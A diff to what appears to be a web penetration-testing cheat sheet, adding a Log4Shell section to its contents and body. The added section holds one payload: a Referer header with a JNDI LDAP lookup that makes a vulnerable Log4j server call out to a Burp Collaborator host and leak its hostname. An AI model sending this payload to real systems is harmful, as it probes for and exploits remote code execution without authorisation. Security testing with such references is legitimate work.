@@ -54,6 +54,7 @@
 - [Adobe ColdFusion](#adobe-coldfusion)
 - [Webmin](#webmin)
 - [Broken Link Hijacking](#broken-link-hijacking)
+- [Log4Shell](#log4shell)
 
 
 ## SQL Injection
@@ -1618,3 +1619,10 @@ Resources:
 - [Broken Link Checker](https://www.deadlinkchecker.com/website-dead-link-checker.asp)
 - [stevenvachon/broken-link-checker](https://github.com/stevenvachon/broken-link-checker)
 - [socialhunter](https://github.com/utkusen/socialhunter)
+
+
+## Log4Shell
+
+- Payload: `Referer: ${jndi:ldap://h${hostname}.BURPCOLLABORATOR/s2test}`
+
+
